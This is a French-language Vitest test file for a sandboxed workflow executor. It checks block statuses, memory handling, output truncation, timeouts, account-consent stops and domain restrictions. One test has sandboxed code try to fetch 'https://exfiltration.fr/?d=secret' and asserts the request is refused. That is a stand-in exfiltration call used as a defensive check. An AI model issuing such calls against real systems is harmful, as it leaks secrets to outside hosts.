import { describe, it, expect, afterEach } from "vitest";
import { spawn } from "node:child_process";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { PassThrough } from "node:stream";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import {
  DELAI_EXECUTION_MS,
  PROFIL_REFUSE,
  executerWorkflow,
  type ContexteWorkflow,
  type InfraWorkflow,
  type LanceurProcessus,
} from "../../src/workflows/executer.js";
import { SORTIE_MAX_OCTETS } from "../../src/workflows/executions.js";
import type { MemoireBlocs } from "../../src/workflows/memoire.js";
import { validerWorkflow } from "../../src/workflows/valider.js";
import { dossierTemporaire } from "../aide/temporaire.js";

const MOTEUR = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(MOTEUR, "recolteur.mjs");
const MAINTENANT = new Date("2026-10-29T10:00:00.000Z");

const aFermer: { fermer(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
});

async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requetes: string[] = [];
  const s: Server = createServer((req, res) => {
    requetes.push(req.url ?? "");
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const serveur = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  aFermer.push(serveur);
  return serveur;
}

const valide = (brut: unknown) => {
  const r = validerWorkflow(brut);
  if (!r.ok) throw new Error(r.erreur);
  return r.valide;
};

/** code (fichier `<id>.mjs`) → … → sortie, en chaîne. */
const chaine = (...ids: string[]) => ({
  version: 1,
  blocs: [...ids.map((id) => ({ id, type: "code", parametres: { source: `${id}.mjs` } })), { id: "sortie", type: "sortie", parametres: { vers: "widget" } }],
  liens: [...ids, "sortie"].slice(1).map((vers, i) => ({ de: [...ids, "sortie"][i]!, vers })),
});

interface Banc {
  ctx: ContexteWorkflow;
  infra: InfraWorkflow;
  commandes: string[][];
  supprimes: string[];
  tues: number;
  refusEnCours: number;
}

/** Un widget (fichiers dans un dossier temporaire) et un lanceur qui exécute le récolteur en local, sans docker. */
async function banc(
  workflow: unknown,
  fichiers: Record<string, string> = {},
  o: { compte?: string[]; publiques?: string[]; accord?: { profil: string } | null; pont?: PontFactice; memoire?: MemoireBlocs; delaiMs?: number; lancer?: LanceurProcessus } = {},
): Promise<Banc> {
  const dossier = await dossierTemporaire();
  for (const [nom, contenu] of Object.entries(fichiers)) await writeFile(join(dossier, nom), contenu);
  const b: Banc = {
    commandes: [],
    supprimes: [],
    tues: 0,
    refusEnCours: 0,
    ctx: {
      proprietaire: { type: "widget", id: "essai" },
      valide: valide(workflow),
      dossierFichiers: dossier,
      config: { interets: "rust" },
      precedent: null,
      memoire: o.memoire ?? {},
      sources: { compte: o.compte ?? [], publiques: o.publiques ?? [] },
      accord: async () => (o.accord === undefined ? null : o.accord),
      surProfilRefuse: async () => {
        b.refusEnCours++;
      },
      messageAccordRequis: "Accord requis pour lire avec ton compte : app.daily.dev",
      declencheur: "manuelle",
    },
    infra: {
      moteur: MOTEUR,
      atelier: {
        commandeRecolte: (id, d, m) => ["docker", "run", id, d, m],
        supprimerRecolte: async (id) => {
          b.supprimes.push(id);
        },
      },
      lancer:
        o.lancer ??
        ((cmd, args) => {
          b.commandes.push([cmd, ...args]);
          const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
          return {
            stdin: e.stdin,
            stdout: e.stdout,
            stderr: e.stderr,
            tuer: () => {
              b.tues++;
              e.kill("SIGKILL");
            },
            fin: new Promise((ok) => e.on("close", (c) => ok(c))),
          };
        }),
      ia: null,
      pont: o.pont ?? new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } }),
      horloge: () => MAINTENANT,
      delaiMs: o.delaiMs,
      adressesLocales: true,
    },
  };
  return b;
}

/** Un faux processus qui écrit ces lignes sur stdout puis sort avec `code`. */
const lanceurScripte = (lignes: unknown[], code = 0): LanceurProcessus => () => {
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const stdin = new PassThrough();
  stdin.resume();
  const fin = new Promise<number | null>((ok) => {
    setImmediate(() => {
      for (const l of lignes) stdout.write((typeof l === "string" ? l : JSON.stringify(l)) + "\n");
      stdout.end();
      stderr.end();
      setImmediate(() => ok(code));
    });
  });
  return { stdin, stdout, stderr, tuer: () => {}, fin };
};

describe("executerWorkflow", () => {
  it("un workflow code → sortie rend fin avec la valeur et une exécution réussie bloc par bloc", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async (entree, w) => { w.journal("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [{ x: 1 }, { x: 2 }, { interets: "rust" }] }, memoire: {} });
    expect(r.execution).toMatchObject({
      version: 1,
      id: "2026-10-29T10-00-00-000Z",
      proprietaire: { type: "widget", id: "essai" },
      declencheur: "manuelle",
      debut: MAINTENANT.toISOString(),
      fin: MAINTENANT.toISOString(),
      statut: "reussie",
    });
    expect(r.execution.erreur).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: ["bonjour 2"] },
      { id: "sortie", type: "sortie", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: [] },
    ]);
    // Le journal global garde ce que le code écrit (stderr), comme avant les workflows.
    expect(r.journal).toContain("bonjour 2");
    expect(b.commandes[0]).toEqual(["docker", "run", "essai", b.ctx.dossierFichiers, MOTEUR]);
    expect(b.supprimes).toEqual([]);
  });

  it("un bloc partiel donne une exécution partielle", async () => {
    const web = await serveurWeb({ "/a": (res) => res.end("contenu a") });
    const b = await banc(
      {
        version: 1,
        blocs: [
          { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
          { id: "lire", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
          { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
        ],
        liens: [{ de: "liste", vers: "lire" }, { de: "lire", vers: "sortie" }],
      },
      { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue.t).toBe("fin");
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "partiel", "reussi"]);
    expect(r.execution.blocs[1]!.sortie).toEqual([{ url: `${web.url}/a`, contenu: "contenu a" }, { url: `${web.url}/absente` }]);
    expect(r.execution.blocs[1]!.journal.join("\n")).toMatch(/404/);
  });

  it("un bloc échoué : issue echec, exécution échouée, blocs suivants pas-lancé", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => { throw new Error("cassé : x"); };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "cassé : x", erreurDuCode: true });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.erreur).toBe("cassé : x");
    expect(r.execution.erreurNoyau).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "echoue", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: null, erreur: "cassé : x", journal: [] },
      { id: "b", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
      { id: "sortie", type: "sortie", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
    ]);
  });

  it("la mémoire envoyée par le conteneur revient dans l'issue fin", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const fichiers = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
    const premier = await banc(workflow, fichiers);
    const r1 = await executerWorkflow(premier.ctx, premier.infra);
    expect(r1.issue.t === "fin" && r1.issue.sortie.valeur).toEqual([{ url: "a" }, { url: "b" }]);
    const memoire = r1.issue.t === "fin" ? r1.issue.memoire : null;
    expect(memoire?.nouveaux?.type).toBe("liste.nouveaux");

    // La mémoire est renvoyée au conteneur : rien de nouveau la fois suivante. Une entrée d'un autre bloc ne passe pas.
    const second = await banc(workflow, fichiers, { memoire: { ...memoire!, ailleurs: { type: "liste.nouveaux", valeur: [] } } });
    const r2 = await executerWorkflow(second.ctx, second.infra);
    expect(r2.issue.t === "fin" && r2.issue.sortie.valeur).toEqual([]);
    expect(r2.issue.t === "fin" && Object.keys(r2.issue.memoire ?? {})).toEqual(["nouveaux"]);
  });

  it("une trace pour un bloc inconnu ou mal formée est ignorée", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        l({ t: "bloc", id: "inconnu", etape: "fin", statut: "reussi", sortie: 1 });
        l({ t: "journal", bloc: "inconnu", texte: "x" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "bizarre" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        process.stdout.write("pas du json\\n");
        return 1;
      };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.blocs.map((x) => x.id)).toEqual(["a", "sortie"]);
    expect(r.execution.blocs[1]).toMatchObject({ statut: "reussi", sortie: 1 });
  });

  it("une trace forgée pour un bloc qui n'est pas le suivant ne compte pas", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "b", etape: "debut" });
        l({ t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" });
        throw new Error("cassé");
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "echec", erreur: "cassé" });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
    expect(r.execution.blocs[1]!.sortie).toBeUndefined();
  });

  it("mémoire forgée : seulement les blocs du workflow avec leur type, la dernière ligne avant fin compte", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "nouveaux", vers: "sortie" }],
    };
    const b = await banc(workflow, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["premiere"] } } },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"] }, autre: { type: "liste.nouveaux", valeur: 1 }, sortie: { type: "code", valeur: 2 } } },
        { t: "memoire", memoire: "pas un objet" },
        { t: "fin", donnees: [] },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["après fin"] } } },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [] }, memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"] } } });
    // Aucune trace de bloc reçue : un bloc jamais commencé reste pas-lancé.
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["pas-lance", "pas-lance"]);
  });

  it("une mémoire de plus de 3 Mo est écartée avec une remarque au journal", async () => {
    const b = await banc({ version: 1, blocs: [{ id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } }, { id: "sortie", type: "sortie" , parametres: { vers: "widget" } }], liens: [{ de: "nouveaux", vers: "sortie" }] }, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: "x".repeat(3.5 * 1024 * 1024) } } },
        { t: "fin", donnees: 1 },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    expect(r.journal).toMatch(/mémoire/i);
  });

  it("une trace de bloc commencé sans fin le donne échoué ; journal de bloc borné à 200 lignes de 500 caractères", async () => {
    const b = await banc(chaine("a"), {}, {
      lancer: lanceurScripte([
        { t: "bloc", id: "a", etape: "debut" },
        ...Array.from({ length: 250 }, (_, i) => ({ t: "journal", bloc: "a", texte: `${i} ${"y".repeat(800)}` })),
        { t: "echec", erreur: "arrêt" },
      ], 1),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "arrêt", erreurDuCode: true });
    const a = r.execution.blocs[0]!;
    expect(a.statut).toBe("echoue");
    expect(a.journal).toHaveLength(200);
    expect(a.journal[0]).toMatch(/51 lignes coupées/);
    expect(a.journal[199]!.startsWith("249 ")).toBe(true);
    expect(a.journal.every((l) => l.length <= 500)).toBe(true);
    expect(r.execution.blocs[1]!.statut).toBe("pas-lance");
  });

  it("une sortie de 5 Mo (page énorme) arrive tronquée et marquée, sans arrêter l'exécution", async () => {
    const b = await banc(chaine("enorme", "moyenne", "court"), {
      "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
      "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
      "court.mjs": `export default async (e) => ({ longueur: e.length });`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: { longueur: 1024 * 1024 } } });
    expect(r.execution.statut).toBe("reussie");
    const [enorme, moyenne, court] = r.execution.blocs;
    expect(enorme).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(enorme!.sortie).toBeUndefined();
    expect(moyenne).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(typeof moyenne!.sortie).toBe("string");
    expect(Buffer.byteLength(moyenne!.sortie as string)).toBeLessThanOrEqual(SORTIE_MAX_OCTETS);
    expect((moyenne!.sortie as string).startsWith('"xxx')).toBe(true);
    expect(court).toMatchObject({ statut: "reussi", sortie: { longueur: 1024 * 1024 } });
    expect(court!.sortieTronquee).toBeUndefined();
  });

  it("lirePage avec compte sans accord : arrêt accord-requis", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: null, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("echoue");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("ProfilRefuse : surProfilRefuse appelé, arrêt PROFIL_REFUSE", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], refuser: ["perso"] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.refusEnCours).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: PROFIL_REFUSE });
    expect(r.execution.statut).toBe("accord-requis");
  });

  it("une fin écrite tôt par le code : exécution partielle, blocs suivants pas-lancé", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        process.stdout.write(JSON.stringify({ t: "fin", donnees: "tôt" }) + "\\n");
        await new Promise((ok) => setTimeout(ok, 50));
        process.exit(0);
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "tôt" } });
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
  });

  it("accord retiré entre deux lectures avec compte : arrêt accord-requis, pas de seconde lecture", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(
      chaine("a"),
      { "a.mjs": `export default async (e, w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); return w.lirePage("https://app.daily.dev/", { compte: true }); };` },
      { compte: ["app.daily.dev"], pont },
    );
    let lectures = 0;
    b.ctx.accord = async () => (lectures++ === 0 ? { profil: "perso" } : null);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution.statut).toBe("accord-requis");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(1);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("lirePage avec compte et accord : le pont reçoit le profil et les domaines déclarés", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "articles" } });
    expect(pont.appels.find((a) => a.methode === "lirePageInvisible")!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("recuperer vers un domaine non déclaré pour un propriétaire avec compte : refusé", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
          await essai(w.recuperer("http://localhost:${web.port}/")),
          await essai(w.lirePage("https://exfiltration.fr/")),
          await essai(w.recuperer("${web.url}/")),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["127.0.0.1"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const [externe, autreNom, page, declare] = (r.issue.t === "fin" ? r.issue.sortie.valeur : []) as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(autreNom).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
  });

  it("délai dépassé : arrêt « Délai dépassé » et conteneur supprimé", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default () => new Promise(() => {});` }, { delaiMs: 600 });
    const debut = Date.now();
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    expect(r.execution).toMatchObject({ statut: "echouee", erreur: "Délai dépassé", erreurNoyau: true });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance"]);
    expect(b.tues).toBeGreaterThan(0);
    expect(b.supprimes).toEqual(["essai"]);
    expect(DELAI_EXECUTION_MS).toBe(200_000);
  });

  it("le debut porte le workflow validé et la config ; la mémoire suit", async () => {
    const recu: string[] = [];
    const b = await banc(chaine("a"), {}, {
      lancer: () => {
        const p = lanceurScripte([{ t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
        return p;
      },
      memoire: { a: { type: "code", valeur: 1 } },
    });
    b.ctx.precedent = { ancien: true };
    await executerWorkflow(b.ctx, b.infra);
    const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
    expect(lignes[0]).toEqual({
      t: "debut",
      precedent: { ancien: true },
      maintenant: MAINTENANT.toISOString(),
      config: { interets: "rust" },
      workflow: { blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] },
    });
    expect(lignes[1]).toEqual({ t: "memoire", memoire: { a: { type: "code", valeur: 1 } } });
  });

  it("le conteneur impossible à lancer : arrêt erreur, exécution échouée sans bloc lancé", async () => {
    const b = await banc(chaine("a"));
    b.infra.atelier = { commandeRecolte: () => { throw new Error("Docker introuvable"); }, supprimerRecolte: async () => {} };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Récolte impossible à lancer : Docker introuvable" });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.blocs.every((x) => x.statut === "pas-lance")).toBe(true);
  });
});
